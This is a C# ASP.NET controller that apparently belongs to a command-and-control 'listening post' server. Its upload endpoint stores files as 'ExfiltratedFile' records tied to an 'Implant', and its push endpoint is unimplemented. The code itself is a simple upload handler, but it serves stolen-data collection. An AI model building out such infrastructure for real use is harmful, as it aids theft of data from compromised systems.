using System;
using ListeningPostApiServer.Data;
using ListeningPostApiServer.Interfaces;
using ListeningPostApiServer.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.IO;
using System.Threading.Tasks;

namespace ListeningPostApiServer.Controllers
{
    [ApiController]
    [Route("[Controller]")]
    public class FileController : ControllerBase
    {
        public FileRepository FileRepository;
        public DbContext Context;

        public FileController(IRepository<FileBase> fileRepository)
        {
            FileRepository = (FileRepository) fileRepository;
            Context = FileRepository.Context;
        }

        [HttpPost("pull/{nodeId}")]
        public async Task<IActionResult> UploadToServer(int nodeId, IFormFile file)
        {
            var filePath = Path.GetTempFileName();

            if (file.Length <= 0) return BadRequest();

            using (var stream = new FileStream(filePath, FileMode.Create))
            {
                await file.CopyToAsync(stream);
            }

            var implant = await FileRepository.Context.Set<Implant>().FindAsync(nodeId);

            var newExFile = new ExfiltratedFile()
            {
                FilePath = filePath,
                FromImplant = implant
            };

            await FileRepository.CreateAsync(newExFile);
            await FileRepository.SaveChangesAsync();

            return Ok();

        }

        [HttpPost("push/{id}")]
        public async Task<IActionResult> Push()
        {
            await Task.CompletedTask;
            throw new NotImplementedException();
        }
    }
}
